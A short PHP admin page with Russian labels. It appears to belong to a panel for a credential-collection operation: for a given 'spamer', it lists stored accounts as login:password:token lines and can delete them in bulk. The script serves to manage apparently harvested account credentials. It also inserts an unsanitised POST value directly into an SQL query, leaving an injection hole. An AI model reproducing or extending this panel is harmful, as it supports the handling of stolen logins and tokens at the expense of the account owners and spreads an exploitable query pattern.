<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta http-equiv="x-ua-compatible" content="ie=edge">

  <title>Adm | Найдено</title>
  <style>
  body {
	  font-family: "Source Sans Pro",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol";
  }
</style>
</head>
<body>
</body>
</html>
<?php 
include '../bdlog.php';
if(isset($_SESSION['admin'])) {
	
$spamer = $_POST['spamer'];
$val = '0';

$query = "select id,login,pass,token,fromsp from data where fromsp = '$spamer'";

$result = $db->query($query);
echo "Список аккаунтов спамера - ".$spamer." :<br><hr noshade size=1 width=190 color=black align=left>";

if ( $_POST['delak'] == '1') {
 while($row = mysqli_fetch_array($result))
{
	if ( $_POST['token'] == '1') {
		$delid = $row['id'];
echo $row['login'].":".$row['pass'].":".$row['token']."<br>";
$val = $val + '1';
$db->query("DELETE FROM data WHERE id = $delid") or die (mysql_error());
	} else {
$delid = $row['id'];
echo $row['login'].":".$row['pass']."<br>";
$val = $val + '1';
$db->query("DELETE FROM data WHERE id = $delid") or die (mysql_error());
	}
}
} else {	
while($row = mysqli_fetch_array($result))
{
	if ( $_POST['token'] == '1') {
		echo $row['login'].":".$row['pass'].":".$row['token']."<br>";
       $val = $val + '1';
	} else {
echo $row['login'].":".$row['pass']."<br>";
$val = $val + '1';
	}
}
}
echo "<hr noshade size=1 width=190 color=black align=left>Аккаунтов по критериям: ".$val;
if ( $_POST['delak'] == '1') {
 echo "<br>Аккаунтов удалено: ".$val;
}
} else { echo '<META HTTP-EQUIV="REFRESH" CONTENT="0;URL=auth.php">'; }
?>